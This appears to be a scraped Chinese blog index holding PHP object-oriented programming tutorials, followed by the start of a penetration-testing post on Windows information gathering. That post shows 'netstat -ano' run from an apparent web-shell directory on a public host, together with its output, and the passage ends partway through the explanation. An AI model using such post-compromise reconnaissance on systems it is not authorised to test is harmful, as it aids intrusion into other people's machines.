class="line"><span class="keyword">private</span> $name;<span class="comment">//商品名称</span></span><br><span class="line"><span class="keyword">private</span> $price;<span class="comment">//商品价格</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//受保护的构造方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name2,$price2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = $name2;</span><br><span class="line"><span class="keyword">$this</span>-&gt;price = $price2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//受保护的显示商品方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="string">&quot;商品名称：<span class="subst">&#123;$this-&gt;name&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;商品价格：<span class="subst">&#123;$this-&gt;price&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建手机类，并继承商品类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mobile</span> <span class="keyword">extends</span> <span class="title">Shop</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的手机属性</span></span><br><span class="line"><span class="keyword">private</span> $pinpai;<span class="comment">//手机品牌</span></span><br><span class="line"><span class="keyword">private</span> $city;<span class="comment">//手机产地</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//重写父类的构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name2,$price2,$pinpai2,$city2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//调用父类的构造方法</span></span><br><span class="line"><span class="built_in">parent</span>::__construct($name2,$price2);</span><br><span class="line"><span class="keyword">$this</span>-&gt;pinpai = $pinpai2;</span><br><span class="line"><span class="keyword">$this</span>-&gt;city   = $city2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写父类的showInfo()方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="built_in">parent</span>::showInfo();</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;手机品牌：<span class="subst">&#123;$this-&gt;pinpai&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;手机产地：<span class="subst">&#123;$this-&gt;city&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建图书类，并继承商品类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span> <span class="keyword">extends</span> <span class="title">Shop</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的图书属性</span></span><br><span class="line"><span class="keyword">private</span> $author;<span class="comment">//作者</span></span><br><span class="line"><span class="keyword">private</span> $publish;<span class="comment">//出版社</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//重写父类的构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name2,$price2,$author2,$publish2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//调用父类的构造方法</span></span><br><span class="line"><span class="built_in">parent</span>::__construct($name2,$price2);</span><br><span class="line"><span class="keyword">$this</span>-&gt;author = $author2;</span><br><span class="line"><span class="keyword">$this</span>-&gt;publish= $publish2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写父类的showInfo()方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="built_in">parent</span>::showInfo();</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;作者：<span class="subst">&#123;$this-&gt;author&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;出版社：<span class="subst">&#123;$this-&gt;publish&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建手机类对象</span></span><br><span class="line">$obj1 = <span class="keyword">new</span> Mobile(<span class="string">&#x27;苹果X&#x27;</span>,<span class="number">8888</span>,<span class="string">&#x27;苹果&#x27;</span>,<span class="string">&#x27;天津市&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $obj1-&gt;showInfo();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//创建图书类对象</span></span><br><span class="line">$obj2 = <span class="keyword">new</span> Book(<span class="string">&#x27;PHP从入门到放弃&#x27;</span>,<span class="number">199.00</span>,<span class="string">&#x27;武大郎&#x27;</span>,<span class="string">&#x27;武大烧饼铺&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;showInfo();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP开发学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发学习--核心编程4</title>
      <link href="2019/12/12/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B4/"/>
      <url>2019/12/12/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B4/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP核心编程4"><a href="#PHP核心编程4" class="headerlink" title="PHP核心编程4"></a>PHP核心编程4</h1><h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h2><h3 id="类的定义语法格式"><a href="#类的定义语法格式" class="headerlink" title="类的定义语法格式"></a>类的定义语法格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stuent</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&quot;steady&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="number">24</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__FILE__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="类的成员属性定义"><a href="#类的成员属性定义" class="headerlink" title="类的成员属性定义"></a>类的成员属性定义</h3><h4 id="成员属性介绍"><a href="#成员属性介绍" class="headerlink" title="成员属性介绍"></a>成员属性介绍</h4><p>类的成员属性，就是指某个类具有的公共的特征、特性；</p><p>类中定义的变量，就是类的成员属性；</p><p>类的成员属性和普通变量的区别：类的成员属性必须要带权限修饰符，而普通变量不需要。</p><h4 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h4><p>成员属性必须要加权限修改符，否则报错。</p><p>public(公共权限)：在任何地方都可以访问，主要包括：类外、本类中、子类中都可以访问。</p><p>private(私有权限)：只能在本类中被访问，在类外和子类中都无权访问。</p><p>protected(受保护的权限)：只能在本类中和子类中被访问，在类外不能被访问。</p><p>举例说明</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stuent</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&quot;steady&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $age=<span class="number">24</span>;</span><br><span class="line">    <span class="keyword">protected</span> $steady;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="类的成员方法定义"><a href="#类的成员方法定义" class="headerlink" title="类的成员方法定义"></a>类的成员方法定义</h3><h4 id="成员方法介绍"><a href="#成员方法介绍" class="headerlink" title="成员方法介绍"></a>成员方法介绍</h4><p>类的方法，就是某个类的公共的的行为或动作；</p><p>类的成员方法，与普通函数一样，都有返回值和参数；</p><p>成员方法与普通函数区别：成员方法只能存在于类中，成员方法定义前可以添加访问权限修饰符；</p><p>提示：成员方法可以省略权限修饰符，默认访问权限是public。</p><p>举例说明</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stuent</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">steady</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__FILE__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">steady</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="创建类的实例对象"><a href="#创建类的实例对象" class="headerlink" title="创建类的实例对象"></a>创建类的实例对象</h3><h4 id="实例化对象的含义"><a href="#实例化对象的含义" class="headerlink" title="实例化对象的含义"></a>实例化对象的含义</h4><p>定义类是为了生产对象，如果不生产对象，类就没有意义。</p><p>一个类可以产生千千万万个对象，对象帮我们干活。</p><p>对象实例化：从一个类上来生产对象过程，就是类的实例化。</p><p>语法格式</p><p>使用new关键字来创建对象。</p><p>JS创建对象的方法：var today = new Date()</p><p>PHP创建对象的方法：$obj = new Student()</p><h4 id="对象属性操作"><a href="#对象属性操作" class="headerlink" title="对象属性操作"></a>对象属性操作</h4><h5 id="如何访问对象的属性和方法？"><a href="#如何访问对象的属性和方法？" class="headerlink" title="如何访问对象的属性和方法？"></a>如何访问对象的属性和方法？</h5><p>在PHP中，访问对象属性和方法，是通过”<strong><em>\</em>-&gt;**</strong>“来访问的。例如：$obj-&gt;name、$obj-&gt;showInfo()</p><h5 id="对象属性的操作"><a href="#对象属性的操作" class="headerlink" title="对象属性的操作"></a>对象属性的操作</h5><h5 id="对象方法操作"><a href="#对象方法操作" class="headerlink" title="对象方法操作"></a>对象方法操作</h5><p>对象方法的操作：方法定义、方法调用、传递参数、方法返回值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echo_info</span>(<span class="params">$age,$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;名字为<span class="subst">&#123;$name&#125;</span>,年龄为<span class="subst">&#123;$age&#125;</span>。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$student1=<span class="keyword">new</span> Student;</span><br><span class="line">$student1-&gt;echo_info(<span class="number">12</span>,<span class="string">&#x27;steady&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="伪变量-this的使用"><a href="#伪变量-this的使用" class="headerlink" title="伪变量$this的使用"></a>伪变量$this的使用</h3><h4 id="伪变量-this的含义"><a href="#伪变量-this的含义" class="headerlink" title="伪变量$this的含义"></a>伪变量$this的含义</h4><p>在PHP中，使用$this变量来代替当前对象，例如：$this-&gt;name = ‘张三’</p><p>$this代表当前对象，是到当前对象的一个引用；</p><p>$this更像是一个对象指针，指向当前对象；</p><p>$this只能用在对象方法定义中，去调用对象的成员属性或成员方法。</p><p>只有创建对象后，$this变量才存在。类不会自动运行。</p><h4 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="comment">//私有的成员属性：类外无法访问</span></span><br><span class="line"><span class="keyword">private</span> $name = <span class="string">&quot;张三丰&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> $age  = <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//受保护的成员方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showLine</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//公共的成员(对象)方法</span></span><br><span class="line"><span class="comment">//$this变量只能在成员方法中使用</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//在成员方法中，使用$this变量代替传递进来的$obj对象</span></span><br><span class="line"><span class="comment">//$this和$obj指向的是同一个对象</span></span><br><span class="line">$str = <span class="string">&quot;&lt;h2&gt;<span class="subst">&#123;$this-&gt;name&#125;</span>的基本信息&lt;/h2&gt;&quot;</span>;</span><br><span class="line">$str .= <span class="keyword">$this</span>-&gt;showLine();</span><br><span class="line">$str .= <span class="string">&quot;<span class="subst">&#123;$this-&gt;name&#125;</span>的年龄是<span class="subst">&#123;$this-&gt;age&#125;</span>岁！&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建学生类的对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student;</span><br><span class="line"><span class="comment">//调用对象的方法</span></span><br><span class="line">$obj-&gt;showInfo();</span><br></pre></td></tr></table></figure><h3 id="类常量的定义"><a href="#类常量的定义" class="headerlink" title="类常量的定义"></a>类常量的定义</h3><h4 id="类常量介绍"><a href="#类常量介绍" class="headerlink" title="类常量介绍"></a>类常量介绍</h4><p>可以把在类中始终保持不变的值定义为常量，例如：圆周率、班级名称等。</p><p>常量的值必须是一个定值，不能修改，也不能删除；</p><p>类常量就是类的常量，是与类相关的，与对象无关。</p><p>类常量在内存中只有一份，不管创建多少个对象。</p><p>类常量可以极大节省服务器内存，可以被所有对象去共享。</p><h4 id="类常量定义和调用格式"><a href="#类常量定义和调用格式" class="headerlink" title="类常量定义和调用格式"></a>类常量定义和调用格式</h4><p>类常量没有权限，只有属性和方法才会有权限。</p><p>使用const来定义类的常量(局部常量)，只能在局部作用域下使用；define()定义常量是全局常量，在任何地方都可以使用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="comment">//声明类常量</span></span><br><span class="line"><span class="keyword">const</span> DB_HOST = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> DB_USER = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> DB_PASS = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的成员方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">$str = <span class="string">&quot;&lt;h2&gt;在类内访问类常量&lt;/h2&gt;&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;主机名：&quot;</span>.Student::DB_HOST;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;用户名：&quot;</span>.Student::DB_USER;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;密码：&quot;</span>.Student::DB_PASS;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用静态化方式，直接访问类常量，不需要创建对象</span></span><br><span class="line">$str = <span class="string">&quot;&lt;h2&gt;在类外访问类常量&lt;/h2&gt;&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;主机名：&quot;</span>.Student::DB_HOST;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;用户名：&quot;</span>.Student::DB_USER;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;密码：&quot;</span>.Student::DB_PASS;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student();</span><br><span class="line">$obj-&gt;showInfo();</span><br></pre></td></tr></table></figure><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><h4 id="什么是构造方法"><a href="#什么是构造方法" class="headerlink" title="什么是构造方法"></a>什么是构造方法</h4><p>当使用new关键字创建对象时，第1个自动调用的方法，就是构造方法；</p><p>构造方法的名称是固定的：<code>void __construct ([ mixed $args [, $... ]] )</code></p><p>构造方法可以带参数，也可以不带参数；构造方法不是必须的，是可选的；</p><p>构造方法的作用：对象初始化。例如：给对象属性赋值、数据库对象初始化(连接、选择数据库</p><p>构造方法一定是成员方法。构造方法的权限可以自己指定。</p><p>构造方法一般不需要主动调用，都是自动调用的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="comment">//私有的成员属性：在项目中，成员属性没有具体的数据，可以有默认值</span></span><br><span class="line"><span class="comment">//所有数据都来自外部传递，所有属性一般都是私有的</span></span><br><span class="line"><span class="keyword">private</span> $name;</span><br><span class="line"><span class="keyword">private</span> $sex;</span><br><span class="line"><span class="keyword">private</span> $age;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name2,$sex2,$age2</span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = $name2;</span><br><span class="line"><span class="keyword">$this</span>-&gt;sex  = $sex2;</span><br><span class="line"><span class="keyword">$this</span>-&gt;age  = $age2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的自我显示的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$str = <span class="string">&quot;姓名：<span class="subst">&#123;$this-&gt;name&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;性别：<span class="subst">&#123;$this-&gt;sex&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;年龄：<span class="subst">&#123;$this-&gt;age&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建学生类的对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student(<span class="string">&quot;张三四&quot;</span>,<span class="string">&quot;男&quot;</span>,<span class="number">26</span>);</span><br><span class="line">$obj-&gt;showInfo();</span><br></pre></td></tr></table></figure><h3 id="析构方法"><a href="#析构方法" class="headerlink" title="析构方法"></a>析构方法</h3><h4 id="什么是析构方法"><a href="#什么是析构方法" class="headerlink" title="什么是析构方法"></a>什么是析构方法</h4><p>对象销毁前自动调用的方法，就是析构方法； </p><p>析构方法的名称是固定的：<code>void __destruct ( void )</code></p><p>析构方法不带任何参数；</p><p>析构方法一定是成员方法。</p><p>析构方法的作用：垃圾回收工作，例如：断开到MySQL的连接</p><h4 id="对象何时销毁"><a href="#对象何时销毁" class="headerlink" title="对象何时销毁"></a>对象何时销毁</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;对象即将销毁&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$student1=<span class="keyword">new</span> Student();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;steady&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP开发学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试--windows系统信息收集与提权-(2)</title>
      <link href="2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(2)/"/>
      <url>2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(2)/</url>
      
        <content type="html"><![CDATA[<h2 id="常用信息收集命令"><a href="#常用信息收集命令" class="headerlink" title="常用信息收集命令"></a>常用信息收集命令</h2><h4 id="netstat-ano"><a href="#netstat-ano" class="headerlink" title="netstat -ano"></a>netstat -ano</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; netstat -ano</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200613165717647.png" alt="image-20200613165717647"></p><p>解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">協定     本機位址                外部位址                狀態            PID</span><br><span class="line">Proto   Local Address          Foreign Address        State</span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1964</span><br><span class="line">  TCP    0.0.0.0:81             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:82             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:83             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:84             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:85             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    210.65.11.201:50913    111.221.29.254:443     TIME_WAIT       0</span><br><span class="line">  TCP    210.65.11.201:50918    40.90.22.187:443       ESTABLISHED     392</span><br><span class="line">  TCP    210.65.11.201:50919    117.18.237.29:80       ESTABLISHED     392</span><br><span class="line">  TCP    210.65.11.201:50920    52.139.153.205:443     ESTABLISHED     392</span><br><span class="line">  TCP    210.65.11.201:50921    52.229.171.202:443     TIME_WAIT       0</span><br><span class="line">  TCP    210.65.11.201:50922    40.91.91.94:443        TIME_WAIT       0</span><br><span class="line">  TCP    210.65.11.201:50923    111.221.29.254:443     ESTABLISHED     1908</span><br><span class="line">  TCP    210.65.11.201:50924    210.65.144.217:80      TIME_WAIT       0</span><br><span class="line">  TCP    210.65.11.201:50925    20.189.73.166:443      TIME_WAIT       0</span><br><span class="line">  TCP    210.65.11.201:50926    111.221.29.254:443     ESTABLISHED     1908</span><br><span class="line">  TCP    210.65.11.201:50930    210.65.144.232:80      ESTABLISHED     392</span><br><span class="line">  TCP    210.65.11.201:50931    111.221.29.254:443     ESTABLISHED     1908</span><br><span class="line">  TCP    210.65.11.201:50932    52.163.83.146:443      ESTABLISHED     8832</span><br><span class="line">  TCP    [::]:80                [::]:0                 LISTENING       1964</span><br><span class="line">  UDP    127.0.0.1:1900         *:*    4732</span><br><span class="line">  UDP    127.0.0.1:56122        *:*    392</span><br><span class="line">  UDP    127.0.0.1:61790        *:*    4732</span><br><span class="line">  UDP    [::]:123               *:*    360</span><br><span class="line">  UDP    [::]:500               *:*    392</span><br><span class="line">  UDP    [::]:3389              *:*    848</span><br><span class="line">  UDP    [::]:4500              *:*    392</span><br><span class="line">  UDP    [::]:5353              *:*    1064</span><br></pre></td></tr></table></figure><ul><li><p>协议（Proto ）：TCP ，指是传输层通讯协议</p></li><li><p>本地机器名（Local Address ）和端口：0.0.0.0:80</p></li><li><p>远程机器名（Foreign Address ）和端口：52.163.83.146:443</p></li><li><p>状态列表：</p><p>LISTEN  ：在监听状态中。<br>ESTABLISHED ：已建立联机的联机情况。<br>TIME_WAIT 